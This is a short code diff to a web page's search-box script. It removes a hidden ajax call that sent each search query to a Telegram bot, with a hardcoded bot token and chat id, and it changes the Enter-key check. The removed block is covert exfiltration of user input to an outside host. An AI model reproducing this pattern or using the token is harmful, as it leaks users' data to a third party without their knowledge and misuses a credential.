@@ -4,12 +4,6 @@
 
 function inputFunction() {
   var x = document.getElementById("search-box").value;
-    $.ajax({
-        url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
-        method: 'POST',
-        data: { chat_id: '699973760', text: x },
-
-    });
   return x
   
 }
@@ -22,7 +16,7 @@ function inputFunction() {
 
 document.getElementById("search-box").addEventListener("keydown", function(event) {
     
-    if (event!= null && event.code == 'Enter') {
+    if (event!= null && event.keyCode == 13) {
         event.preventDefault();
         input = inputFunction();
         $.ajax({
